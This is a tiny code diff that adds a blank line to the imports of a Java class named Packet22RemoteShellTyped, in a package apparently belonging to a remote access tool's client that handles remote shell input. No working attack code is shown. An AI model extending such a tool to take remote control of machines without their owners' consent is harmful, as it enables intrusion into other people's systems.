@@ -2,6 +2,7 @@ package jrat.client.packets.incoming;
 
 import jrat.client.Connection;
 import jrat.client.RemoteShell;
+
 import java.io.PrintWriter;
 
 public class Packet22RemoteShellTyped extends AbstractIncomingPacket {
